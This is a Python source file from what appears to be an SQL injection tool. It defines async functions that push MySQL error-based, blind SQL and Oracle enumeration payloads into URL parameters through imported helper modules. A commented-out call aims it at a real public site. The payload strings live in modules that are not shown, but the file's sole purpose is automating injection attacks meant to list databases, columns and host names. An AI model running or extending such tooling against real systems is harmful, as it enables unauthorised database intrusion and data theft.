import os
import sys
import asyncio

cur = os.getcwd()
sys.path.append(cur)

from lib.regelexpression.extractparameter import parameter_injection 
from lib.mysqlerrorbased.errorbasedpayload import ErrorBasedPayload
from lib.mysqlblind.blindsqlpayloads import BlindSqlPayloads
from lib.OracleSQLinjection.oraclepayloads import OraclePayloads
from INFO.common import tables
from random import choice

async def Error_http_req_param_payload(url,payload=ErrorBasedPayload.http_error_req(choice(tables))):
    parameter = await parameter_injection(url=url,payload=payload)
    return parameter

async def Extract_value_param_payload(url,payload=ErrorBasedPayload.Extractvalue()):
    parameter = await parameter_injection(url=url,payload=payload)
    return parameter

async def Bin_sql_param_payloads(url,payload=BlindSqlPayloads.binsqlpayload()):
    parameter = await parameter_injection(url=url,payload=payload)
    return parameter

async def conditional_blind_sql_param_payload(url,payload=BlindSqlPayloads.conditional_blind_sql_injection()):
    parameter = await parameter_injection(url=url,payload=payload)
    return parameter

async def make_set_sql_param_payload(url,payload=BlindSqlPayloads.make_set_sql_injection()):
    parameter = await parameter_injection(url=url,payload=payload)
    return parameter


async def substring_sql_payload_param(url,payload=BlindSqlPayloads.sub_string_sql_inj()):
    parameter = await parameter_injection(url=url,payload=payload)
    return parameter

async def db_column_list_param_payload(url,payload=OraclePayloads.db_column_list()):
    parameter = await parameter_injection(url=url,payload=payload)
    return parameter

async def db_column_payload_param(url,payload=OraclePayloads.db_column_payload()):
    parameter = await parameter_injection(url=url,payload=payload)
    return parameter

async def host_name_oracle_payloads_param(url,payload=OraclePayloads.Host_name_oracle()):
    parameter = await parameter_injection(url=url,payload=payload)
    return parameter

async def oracle_database_ls_params(url,payload=OraclePayloads.oracle_injection_database_list()):
    parameter = await parameter_injection(url=url,payload=payload)
    return parameter

async def oracle_injection_payload_params(url,payload=OraclePayloads.oracle_injection_payload()):
    parameter = await parameter_injection(url=url,payload=payload)
    return parameter


# print(asyncio.run(Error_based_extract_value(url="www.google.com?id=1")))
